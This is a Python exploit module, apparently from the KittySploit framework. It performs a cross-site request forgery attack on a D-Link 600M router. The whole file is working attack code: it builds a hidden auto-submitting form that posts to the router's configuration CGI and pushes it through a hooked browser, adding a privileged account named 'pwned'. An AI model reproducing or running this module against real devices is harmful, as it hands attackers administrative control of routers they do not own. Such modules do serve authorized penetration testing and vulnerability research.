from kittysploit import *
from lib.protocols.http.csrf import Csrf

class Module(BrowserAuxiliary, Csrf):
	
	__info__ = {
		"name": "D-Link 600M Add User CSRF",
		"description": "D-Link 600M router - Add user via CSRF POST",
		"author": "KittySploit Team",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
	}
	
	target = OptString("http://192.168.1.1", "Target router URL (with http://)", required=True)
	username = OptString("pwned", "Username to add", required=True)
	password = OptString("pwned", "Password for new user", required=True)

	def run(self):
		form_data = [
			f'<form method="POST" action="{self.target}/form2WlanBasicSetup.cgi">',
			f'<input type="hidden" name="username" value="{self.username}" />',
			f'<input type="hidden" name="privilege" value="2" />',
			f'<input type="hidden" name="newpass" value="{self.password}" />',
			f'<input type="hidden" name="confpass" value="{self.password}" />',
			f'<input type="hidden" name="adduser" value="Add" />',
			f'<input type="hidden" name="hiddenpass" value="" />',
			f'<input type="hidden" name="submit&#46;htm&#63;userconfig&#46;htm" value="Send" />',
			f'<input type="submit" value="Submit request" />',
			'</form>'
		]
		
		print_info(f"Executing CSRF POST attack on: {self.target}")
		print_info(f"Target: {self.target}/form2WlanBasicSetup.cgi")
		print_info(f"Username: {self.username}")
		print_info(f"Password: {self.password}")
		
		js_code = self.csrf_post_and_submit(form_data)
		result = self.send_js_and_wait_for_response(js_code, timeout=10.0)
		
		if result:
			print_success("CSRF POST attack executed successfully")
			print_info(f"Response: {result}")
			print_info(f"User creation request sent: {self.username}")
			return True
		else:
			fail.CSRFPostFailed()
		return False